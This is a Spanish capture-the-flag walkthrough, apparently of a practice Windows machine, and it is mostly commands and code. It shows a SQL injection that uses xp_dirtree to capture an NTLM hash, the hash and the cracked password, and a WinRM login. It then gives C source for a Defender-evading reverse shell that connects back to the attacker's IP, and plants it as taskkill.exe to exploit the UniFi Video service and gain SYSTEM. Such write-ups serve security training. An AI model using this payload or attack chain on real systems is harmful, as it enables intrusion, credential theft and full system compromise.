# Enumeración

<img width="849" height="675" alt="image" src="https://github.com/user-attachments/assets/a3173e31-9647-4941-bf66-d93b08a6ce54" />

# Web:

````
gobuster dir -u http://10.129.96.140/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak 
````
<img width="1576" height="745" alt="image" src="https://github.com/user-attachments/assets/919ef7a5-1cfa-4c27-9c63-d2599708109b" />
<img width="641" height="195" alt="image" src="https://github.com/user-attachments/assets/052f1864-9703-4df2-9682-b0f22725f4a9" />
SQLi confirmado 

Vamos a intentar pillar el hash ntml:
````
'+EXEC+master.sys.xp_dirtree+'\\ip\share--
````
<img width="1915" height="139" alt="image" src="https://github.com/user-attachments/assets/8c2a0014-75a0-4459-989f-34a6877a60b2" />
````
echo 'Stacy::GIDDY:008fd08edc009764:C711945CC88F39E9CB187A8D5841DFF4:010100000000000000C054863D70DD01FAB42CFA451E852A0000000002000800560055004A00550001001E00570049004E002D0051004F004200440048003400370038004F005200350004003400570049004E002D0051004F004200440048003400370038004F00520035002E00560055004A0055002E004C004F00430041004C0003001400560055004A0055002E004C004F00430041004C0005001400560055004A0055002E004C004F00430041004C000700080000C054863D70DD01060004000200000008003000300000000000000000000000003000007CFACF82213500BD3E4DD659CA06D0305C64CB23BDC0EC7B57AA568B1090FAE70A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0036003500000000000000000000000000' > hash.txt

````
password and user:
````
stacy:xNnWo6272k7x
````
````
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
````
Nos cnectamos por rdp a ver que tal

````
####### 1. CONEXIÓN COMO STACY (WinRM) #######
evil-winrm -i VICTIMA -u Stacy -p 'tu_password_crackeado'   # shell como Stacy


####### 2. ENUMERACIÓN DE ESCALADA #######
whoami /priv                         # ver privilegios
whoami /groups                       # ver grupos (Users)
# subir winPEAS para enumerar
upload winPEASx64.exe C:\Windows\Temp\wp.exe   # (si falla el upload, usa IWR)
C:\Windows\Temp\wp.exe quiet servicesinfo      # mirar servicios

# winPEAS marca: UniFi Video corre como SYSTEM y su carpeta es escribible
dir C:\Users\Stacy\Documents         # pista: fichero "unifivideo" -> "stop"
type C:\Users\Stacy\Documents\unifivideo


####### 3. CONFIRMAR EL VECTOR (icacls) #######
Get-Service UniFiVideoService        # confirmar que existe y su estado
icacls C:\ProgramData\unifi-video    # Users:(WD,AD) -> puedo CREAR ficheros
icacls C:\ProgramData\unifi-video\avService.exe  # Users:(RX) -> NO puedo tocar el exe
# Conclusión: create-only. El servicio ejecuta taskkill.exe (CVE-2016-6914)
# desde esa carpeta al arrancar/parar, y no existe -> lo planto yo.


####### 4. PAYLOAD EVADIENDO DEFENDER (compilar en C) #######
# (en Kali) Defender se come el .exe de msfvenom, así que compilo el mío:
cat > taskkill.c << 'EOF'
#include <winsock2.h>
#include <windows.h>
#pragma comment(lib,"ws2_32")
int main(void){
    WSADATA wsa; SOCKET s; struct sockaddr_in a;
    STARTUPINFO si; PROCESS_INFORMATION pi;
    WSAStartup(MAKEWORD(2,2),&wsa);
    s=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);
    a.sin_family=AF_INET; a.sin_port=htons(443);
    a.sin_addr.s_addr=inet_addr("10.10.14.65");   # TU IP
    WSAConnect(s,(struct sockaddr*)&a,sizeof(a),0,0,0,0);
    memset(&si,0,sizeof(si)); si.cb=sizeof(si);
    si.dwFlags=STARTF_USESTDHANDLES;
    si.hStdInput=si.hStdOutput=si.hStdError=(HANDLE)s;
    CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,&si,&pi);
    return 0;
}
EOF
x86_64-w64-mingw32-gcc taskkill.c -o taskkill.exe -lws2_32   # compilar


####### 5. SERVIR Y ESCUCHAR (en Kali, 2 pestañas) #######
python3 -m http.server 80            # pestaña 1: servir taskkill.exe
nc -lvnp 443                         # pestaña 2: escuchar la shell


####### 6. PLANTAR EL PAYLOAD (en la víctima) #######
Invoke-WebRequest -Uri http://10.10.14.65/taskkill.exe -OutFile C:\ProgramData\unifi-video\taskkill.exe
dir C:\ProgramData\unifi-video\taskkill.exe   # verificar que persiste (Defender no lo borró)


####### 7. DISPARAR EL SERVICIO -> SYSTEM #######
Start-Service UniFiVideoService      # arranca -> ejecuta mi taskkill.exe como SYSTEM
# si no cae en ~10s:
Stop-Service UniFiVideoService       # también lo ejecuta al parar


####### 8. ROOT #######
whoami                               # nt authority\system
type C:\Users\Administrator\Desktop\root.txt
````
